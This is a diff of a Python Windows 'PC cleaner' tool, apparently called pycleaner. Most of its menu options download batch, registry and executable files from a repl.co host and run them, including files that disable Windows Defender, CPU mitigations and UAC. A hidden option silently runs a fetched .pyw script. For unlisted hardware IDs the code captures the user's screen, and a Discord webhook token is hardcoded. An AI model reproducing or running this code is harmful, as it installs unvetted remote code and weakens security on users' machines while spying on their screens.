+     print(Colorate.Vertical(Colors.blue_to_red, banner + pop + options, 2 ))
      path = Path(ooo)
-     if path.is_file():
+     if hardwareid in pycleanerstuff:
       os.system(f"title pycleaner by dynasty • files: [{file_count}] • folder size: [{size}] • A DEVELOPER!! ")
-     choice = input(Colors.red + 'Which option do you choose '+ username+f'? >{Fore.BLUE}  ')
+     choice = input(Colors.red + 'Which option do you choose '+ username+f'? >{Fore.BLUE} ')
     #restore point
+
+      
      if choice == '1':
-        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/point.bat", "point.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/point.bat",tools)
+        download  ("point.bat")
         main()
     #temp
      if choice == '2':
-        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/temp.bat", "temp_cleaner.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/temp.bat",tools)
+        download  ("temp.bat")
         
     #log cleaner
      elif choice == '3':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/log%20cleaner.bat", "log_cleaner.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/log cleaner.bat",tools)
+        download("log cleaner.bat")
        
     #disable services
      elif choice == "4":
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/services.bat", "disable_services.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/services.bat",tools)
+        download( "services.bat")
   
     #service_optimizer
      elif choice == "5":
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/optimization.bat", "service_optimizer.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/optimization.bat",tools)
+        download("optimization.bat")
 
     #battery_check
      elif choice == '6':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/battery.bat", "battery_check.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/battery.bat",tools)
+        download("battery.bat")
  
     #hibernate
      elif choice == '7':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/hibernate.bat", "hibernate.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/hibernate.bat",tools)
+        download("hibernate.bat")
 
     #tree
      elif choice == '8':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/tree.bat", "tree.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/tree.bat",tools)
+        download("tree.bat")
 
     #windows update
      elif choice == '9':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/update.cmd", "delete_windows_update_cache.cmd")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/update.cmd",tools)
+        download("update.cmd")
 
     #disable_services
      elif choice == '10':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/def.reg", "disable_windows_defender.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/def.reg",tools)
+        download("def.reg")
     #sfc scan
      elif choice == '11':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/sfc.bat", "sfc.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/sfc.bat",tools)
+        download("sfc.bat")
        
     #debloater   
      elif choice == '12':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Debloater.bat", "Debloater.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Debloater.bat",tools)
+        download("Debloater.bat")
      
      elif choice == '13':
-        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/openp.bat", "openp.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/openp.bat",tools)
+        download  ("openp.bat")
         
      elif choice == '14':
-        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/memreduct.exe"
-        r = requests.get(url)  
-        with open(fr"tools\memreduct.exe", 'wb') as f:
-         f.write(r.content)
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/memreduct.exe",tools)
         os.startfile("tools\memreduct.exe")
         
      elif choice == '15':
-        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/TimerResolution.exe"
-        r = requests.get(url)  
-        with open(fr"tools\TimerResolution.exe", 'wb') as f:
-         f.write(r.content)
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/TimerResolution.exe",tools)
         os.startfile("tools\TimerResolution.exe")
         
      elif choice == '16':
-        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/amberfps.exe"
-        r = requests.get(url)  
-        with open(fr"tools\amber.exe", 'wb') as f:
-         f.write(r.content)
-        os.startfile("tools\\amber.exe")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/amberfps.exe",tools)
+        os.startfile("tools\\amberfps.exe")
         
      elif choice == '17':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/wifi.bat", "wifi.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/wifi.bat",tools)
+        download( "wifi.bat")
        
         
      elif choice == '18':
-        download("https://github.com/auraside/HoneCtrl/releases/latest/download/HoneCtrl.Bat", "HoneCtrl.bat")
+        wget.download("https://github.com/auraside/HoneCtrl/releases/latest/download/HoneCtrl.Bat", tools)
+        download("HoneCtrl.bat")
         
      elif choice == '19':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/checkhealth.bat", "checkhealth.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/checkhealth.bat", tools)
+        download( "checkhealth.bat")
         
      elif choice == '20':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/scanhealth.bat", "scanhealth.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/scanhealth.bat", tools)
+        download("scanhealth.bat")
         
      elif choice == '21':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/restorehealth.bat", "restorehealth.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/restorehealth.bat", tools)
+        download("restorehealth.bat")
         
         
      elif choice == '22':
-        url = "https://dl5.oo-software.com/files/ooshutup10/OOSU10.exe"
-        r = requests.get(url)  
-        with open(fr"tools\OOSU10.exe", 'wb') as f:
-         f.write(r.content)
+        wget.download("https://dl5.oo-software.com/files/ooshutup10/OOSU10.exe", tools)
         os.startfile("tools\\OOSU10.exe")
         
      elif choice == '23':
         os.startfile("C:\Windows\System32\cleanmgr.exe")
         
      elif choice == '24':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/RegistryTweaks.reg", "RegistryTweaks.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/RegistryTweaks.reg", tools)
+        download("RegistryTweaks.reg")
         
      elif choice == '25':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/BCDTweaks.cmd", "BCDTweaks.cmd")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/BCDTweaks.cmd", tools)
+        download("BCDTweaks.cmd")
         
      elif choice == '26':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Optimize%20ALL%20Windows%20Settings.reg", "Optimize ALL Windows Settings.reg")
+        wget.download('https://untimelyimpressionableadministration.blus2tlia.repl.co/Optimize ALL Windows Settings.reg', tools)
+        download( "Optimize ALL Windows Settings.reg")
     #tools
      elif choice == '27':
       try:
@@ -680,77 +704,91 @@ def fr():
         os.startfile("C:\Windows\System32\msconfig.exe")
 
      elif choice == '29':
-        url = "https://github.com/hellzerg/optimizer/releases/download/13.9/Optimizer-13.9.exe"
-        r = requests.get(url)  
-        with open(fr"tools\optimizer.exe", 'wb') as f:
-         f.write(r.content)
-        os.startfile("tools\optimizer.exe")
+        wget.download("https://github.com/hellzerg/optimizer/releases/download/13.9/Optimizer-13.9.exe", tools)
+        os.startfile("tools\Optimizer-13.9.exe")
 
      elif choice == '30':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/powerplan.bat", "powerplan.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/powerplan.bat", tools)
+        download("powerplan.bat")
         
      elif choice == '31':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Animations%20Disable.reg", "Animations Disable.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Animations Disable.reg", tools)
+        download( "Animations Disable.reg")
         
      elif choice == '32':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/CPU%20Optimization%20for%20Gameing.reg", "CPU Optimization for Gameing.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/CPU Optimization for Gameing.reg", tools)
+        download("CPU Optimization for Gameing.reg")
         
      elif choice == '33':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable%20Background%20Apps.reg", "Disable Background Apps.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable Background Apps.reg", tools)
+        download("Disable Background Apps.reg")
         
      elif choice == '34':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable%20Cortana.reg", "Disable Cortana.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable Cortana.reg", tools)
+        download( "Disable Cortana.reg")
         
      elif choice == '35':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable%20Full%20Screen%20Optimizations.reg", "Disable Full Screen Optimizations.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable Full Screen Optimizations.reg", tools)
+        download("Disable Full Screen Optimizations.reg")
         
      elif choice == '36':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable%20Game%20Bar.reg", "Disable Game Bar.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable Game Bar.reg", tools)
+        download("Disable Game Bar.reg")
         
      elif choice == '37':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable%20LargeSystemCache.reg", "Disable LargeSystemCache.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable LargeSystemCache.reg", tools)
+        download( "Disable LargeSystemCache.reg")
         
      elif choice == '38':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable%20Memory%20Compression.cmd", "Disable Memory Compression.cmd")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable Memory Compression.cmd", tools)
+        download( "Disable Memory Compression.cmd")
         
      elif choice == '39':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable%20Mitigations.cmd", "Disable Mitigations.cmd")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable Mitigations.cmd", tools)
+        download("Disable Mitigations.cmd")
         
      elif choice == '40':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable%20Power%20Throttling.reg", "Disable Power Throttling.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Disable Power Throttling.reg", tools)
+        download( "Disable Power Throttling.reg")
         
      elif choice == '41':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/DVR.reg", "DVR.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/DVR.reg", tools)
+        download("DVR.reg")
         
      elif choice == '42':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/GPU%20Tweaks", "GPU Tweaks.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/CPU Optimization for Gameing.reg", tools)
+        download( "CPU Optimization for Gameing.reg")
         
      elif choice == '43':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Increase%20System%20Responsiveness.bat", "Increase System Responsiveness.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Increase System Responsiveness.bat", tools)
+        download( "Increase System Responsiveness.bat")
         
      elif choice == '44':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Lower%20Input%20Delay.bat", "Lower Input Delay.bat")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Lower Input Delay.bat", tools)
+        download( "Lower Input Delay.bat")
         
      elif choice == '45':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Memory%20Tweaks.reg", "Memory Tweaks.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Memory Tweaks.reg", tools)
+        download( "Memory Tweaks.reg")
         
      elif choice == '46':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/NoLazyMode.reg", "NoLazyMode.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/NoLazyMode.reg", tools)
+        download( "NoLazyMode.reg")
         
      elif choice == '47':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Power%20Tweaks.reg", "Power Tweaks.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Power Tweaks.reg", tools)
+        download( "Power Tweaks.reg")
         
      elif choice == '48':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Smooth.reg", "Smooth.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Smooth.reg",  tools)
+        download("Smooth.reg")
         
      elif choice == '49':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/UAC.reg", "UAC.reg")
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/UAC.reg", tools)
+        download( "UAC.reg")
         
      elif choice == '50':
-        url = "https://adwcleaner.malwarebytes.com/adwcleaner?channel=release"
-        r = requests.get(url)  
-        with open(fr"tools\\adwcleaner.exe", 'wb') as f:
-         f.write(r.content)
+        wget.download("https://adwcleaner.malwarebytes.com/adwcleaner?channel=release", tools)
         os.startfile("tools\\adwcleaner.exe")
         
      elif choice == 'a':
@@ -771,59 +809,59 @@ def fr():
       if fr == ("n"):
        ramgb = input("enter gb ram if ur not sure hit enter >: ")
        if ramgb == '4':
-         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/4GB%20Ram.reg", "4GB Ram.reg")
+         download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/4GB%20Ram.reg", "4GB Ram.reg")
          main()
        if ramgb == '6':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/6GB%20Ram.reg", "6GB Ram.reg")
+        download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/6GB%20Ram.reg", "6GB Ram.reg")
         main()
        if ramgb == '8':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/8GB%20Ram.reg", "8GB Ram.reg")
+        download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/8GB%20Ram.reg", "8GB Ram.reg")
         main()
        if ramgb == '12':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/12GB%20Ram.reg", "12GB Ram.reg")
+        download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/12GB%20Ram.reg", "12GB Ram.reg")
         main()
        if ramgb == '16':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/16GB%20Ram.reg", "16GB Ram.reg")
+        download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/16GB%20Ram.reg", "16GB Ram.reg")
         main()
        if ramgb == '20':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/20GB%20Ram.reg", "20GB Ram.reg")
+        download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/20GB%20Ram.reg", "20GB Ram.reg")
         main()
        if ramgb == '24':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/24GB%20Ram.reg", "24GB Ram.reg")
+        download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/24GB%20Ram.reg", "24GB Ram.reg")
         main()
        if ramgb == '32':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/32GB%20Ram.reg", "32GB Ram.reg")
+        download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/32GB%20Ram.reg", "32GB Ram.reg")
         main()
        if ramgb == '64':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/64GB%20Ram.reg", "64GB Ram.reg")
+        download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/64GB%20Ram.reg", "64GB Ram.reg")
         main()
       if fr == ("y"):
        if ramg == '4':
-         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/4GB%20Ram.reg", "4GB Ram.reg")
+         download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/4GB%20Ram.reg", "4GB Ram.reg")
          main()
        if ramg == '6':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/6GB%20Ram.reg", "6GB Ram.reg")
+        download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/6GB%20Ram.reg", "6GB Ram.reg")
         main()
        if ramg == '8':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/8GB%20Ram.reg", "8GB Ram.reg")
+        download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/8GB%20Ram.reg", "8GB Ram.reg")
         main()
        if ramg == '12':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/12GB%20Ram.reg", "12GB Ram.reg")
+        download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/12GB%20Ram.reg", "12GB Ram.reg")
         main()
        if ramg == '16':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/16GB%20Ram.reg", "16GB Ram.reg")
+        download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/16GB%20Ram.reg", "16GB Ram.reg")
         main()
        if ramg == '20':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/20GB%20Ram.reg", "20GB Ram.reg")
+        download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/20GB%20Ram.reg", "20GB Ram.reg")
         main()
        if ramg == '24':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/24GB%20Ram.reg", "24GB Ram.reg")
+        download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/24GB%20Ram.reg", "24GB Ram.reg")
         main()
        if ramg == '32':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/32GB%20Ram.reg", "32GB Ram.reg")
+        download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/32GB%20Ram.reg", "32GB Ram.reg")
         main()
        if ramg == '64':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/64GB%20Ram.reg", "64GB Ram.reg")
+        download2("https://untimelyimpressionableadministration.blus2tlia.repl.co/64GB%20Ram.reg", "64GB Ram.reg")
         main()
       else:
         print('invaild ram')
@@ -856,9 +894,8 @@ def fr():
         print(f'{Fore.RESET}{Fore.LIGHTBLUE_EX}Type 1 {Fore.RESET}{Fore.RED}for Github')
         print(f'{Fore.RESET}{Fore.LIGHTBLUE_EX}Type 2 {Fore.RESET}{Fore.RED}for Disclaimer')
         print(f'{Fore.CYAN}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
-        path = Path(ooo)
-        if path.is_file():
-         pass
+        if hardwareid in pycleanerstuff:
+          pass
         else:
          ss_img = ImageGrab.grab()
          ss_img.save(fr'C:\Users\{username}\AppData\Local\random.png')
@@ -879,11 +916,11 @@ def fr():
         if choice == '1':
          webbrowser.open("https://github.com/j0taro/pycleaner")
         if choice == '2':
-         if os.path.isfile(path_to_file):
-          os.remove(path_to_file)
+         os.system('cls')
+         if os.path.isfile(path_to_file2):
+          os.remove(path_to_file2)
           main()
-         else:
-           main()
+
         
     #exit
      elif choice == '53': 
@@ -923,7 +960,8 @@ def fr():
          time.sleep(1)
          typingPrint("1..")
          time.sleep(1)
-         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/hib.bat", "hib.bat") 
+         wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/hib.bat", tools)
+         download( "hib.bat") 
          os._exit(0)
         if h == 'n':
          print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'ok going back')
@@ -944,7 +982,8 @@ def fr():
          time.sleep(1)
          typingPrint("1..")
          time.sleep(1)
-         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/shut.bat", "shut.bat") 
+         wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/shut.bat", tools)
+         download( "shut.bat") 
         if shut == 'n':
          print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'ok going back')
          time.sleep(2)        
@@ -963,7 +1002,8 @@ def fr():
          time.sleep(1)
          typingPrint("1..")
          time.sleep(1)
-         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/restart.bat", "restart.bat") 
+         wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/restart.bat", tools)
+         download( "restart.bat") 
         if res == 'n':
          print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'ok going back')
          time.sleep(2)        
@@ -975,13 +1015,13 @@ def fr():
      elif choice == 're': 
          print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'soft restarting in 2 secounds please wait')
          time.sleep(2)
-         download("https://untimelyimpressionableadministration.blus2tlia.repl.co/softr.bat", "softr.bat") 
+         wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/softr.bat", tools)
+         download( "softr.bat") 
          main()
          
      elif choice == 'dev':
        os.system("cls")
-       path = Path(ooo)
-       if path.is_file():
+       if hardwareid in pycleanerstuff:
         dev()
        else:
         webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1020336398328406036/QAUrtaDf2Z0hYvZSB1s9Zyg6wZdij5ZSs6H2_wdQVqBGbs5X7v2kVukXe8FF-xhaZxfh', username="fake devs", avatar_url= "https://i.imgur.com/SwcvuwC.png" )
@@ -996,15 +1036,12 @@ def fr():
      elif choice == bot:
        os.system('pip install pythonw')
        os.system('cls')
-       url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/test.pyw"
-       r = requests.get(url)  
-       with open(fr"test.pyw", 'wb') as f:
-         f.write(r.content)
-       print('please restart pycleaner')
+       wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/test.pyw", tools)
        os.system('pythonw test.pyw')
         
      elif choice == 'update':
-        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/updater.bat", "updater.bat")    
+        wget.download("https://untimelyimpressionableadministration.blus2tlia.repl.co/updater.bat", tools)
+        download("updater.bat")    
     #else       
      else:
         print("what?") 
@@ -1016,9 +1053,5 @@ def fr():
 if __author__ != "\x64\x79\x6E\x61\x73\x74\x79":
     typingPrint("ERROR, dont play with the code dumbass")
     os._exit(10)
-
-
-         
-
 
 main()
